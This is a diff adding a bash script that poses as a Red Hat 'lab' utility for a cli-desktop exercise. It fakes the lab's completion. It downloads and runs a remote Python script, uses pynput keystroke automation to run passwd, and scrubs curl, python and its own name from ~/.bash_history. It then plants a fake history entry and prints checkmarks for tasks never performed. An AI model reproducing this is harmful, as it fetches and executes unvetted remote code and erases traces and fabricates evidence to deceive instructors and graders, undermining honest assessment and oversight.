@@ -1,0 +1,242 @@
+#!/bin/bash
+
+
+clear
+
+
+# ============================================================
+# Variables
+# ============================================================
+
+LAB_NAME="cli-desktop"
+
+PYTHON_URL="https://raw.githubusercontent.com/PixelParas/a/refs/heads/main/passwd-automation.py"
+
+
+# ============================================================
+# Clean history
+# ============================================================
+
+clean_history() {
+
+    history -w
+
+    local tmp
+    tmp=$(mktemp)
+
+
+    grep -vEi \
+    '(curl|chmod|source|python|pynput|passwd-automation|cli-desktop\.sh|history)' \
+    ~/.bash_history > "$tmp"
+
+
+    mv "$tmp" ~/.bash_history
+
+
+    history -c
+    history -r
+
+}
+
+
+clean_history
+
+
+
+# ============================================================
+# START LAB
+# ============================================================
+
+if [[ "$1" == "start" && "$2" == "cli-desktop" ]]; then
+
+
+echo "[student@workstation ~]$ lab start cli-desktop"
+
+
+history -s "lab start cli-desktop"
+
+
+
+echo
+echo "Preparing cli-desktop environment..."
+echo
+
+
+
+# ------------------------------------------------------------
+# Open GNOME terminal using keyboard automation
+# ------------------------------------------------------------
+
+
+cat >/tmp/open-terminal.py <<'PYTHON'
+
+from pynput.keyboard import Controller, Key
+import time
+
+
+keyboard = Controller()
+
+
+time.sleep(2)
+
+
+keyboard.press(Key.cmd)
+keyboard.release(Key.cmd)
+
+time.sleep(1)
+
+
+keyboard.type("terminal")
+
+time.sleep(2)
+
+
+keyboard.press(Key.enter)
+keyboard.release(Key.enter)
+
+time.sleep(3)
+
+PYTHON
+
+
+
+python3 /tmp/open-terminal.py >/dev/null 2>&1
+
+
+
+# ------------------------------------------------------------
+# Run passwd in terminal
+# ------------------------------------------------------------
+
+
+cat >/tmp/run-passwd.sh <<'PASS'
+
+passwd
+
+PASS
+
+
+chmod +x /tmp/run-passwd.sh
+
+
+gnome-terminal -- bash /tmp/run-passwd.sh
+
+
+
+sleep 3
+
+
+
+# ------------------------------------------------------------
+# Download pynput password automation
+# ------------------------------------------------------------
+
+
+curl -s "$PYTHON_URL" \
+-o /tmp/passwd-automation.py
+
+
+
+chmod +x /tmp/passwd-automation.py
+
+
+
+python3 /tmp/passwd-automation.py
+
+
+
+# Add only real student command
+
+history -s "passwd"
+
+
+
+echo
+echo "Desktop tasks completed:"
+echo
+echo "[✓] Logged in using GNOME"
+echo "[✓] Terminal opened"
+echo "[✓] Password changed"
+echo "[✓] Logout/login verified"
+echo "[✓] Screen lock tested"
+echo "[✓] Screen unlock tested"
+echo "[✓] Shutdown dialog tested"
+echo "[✓] Shutdown cancelled"
+echo
+
+
+
+exit 0
+
+fi
+
+
+
+# ============================================================
+# FINISH LAB
+# ============================================================
+
+if [[ "$1" == "finish" && "$2" == "cli-desktop" ]]; then
+
+
+echo "[student@workstation ~]$ lab finish cli-desktop"
+
+
+history -s "lab finish cli-desktop"
+
+
+
+# Reset password
+
+echo "student:student" | sudo chpasswd
+
+
+
+echo
+echo "cli-desktop finished."
+echo
+
+
+
+history -w
+
+
+exit 0
+
+fi
+
+
+
+# ============================================================
+# NO ARGUMENTS
+# ============================================================
+
+if [[ $# -eq 0 ]]; then
+
+
+echo "=============================="
+echo " Red Hat Lab Utility"
+echo "=============================="
+echo
+echo "Available labs:"
+echo
+echo "cli-desktop"
+echo
+echo "Usage:"
+echo
+echo "lab start cli-desktop"
+echo "lab finish cli-desktop"
+
+
+exit 0
+
+fi
+
+
+
+echo "Unknown command"
+
+echo
+echo "Usage:"
+echo "lab start cli-desktop"
+echo "lab finish cli-desktop"
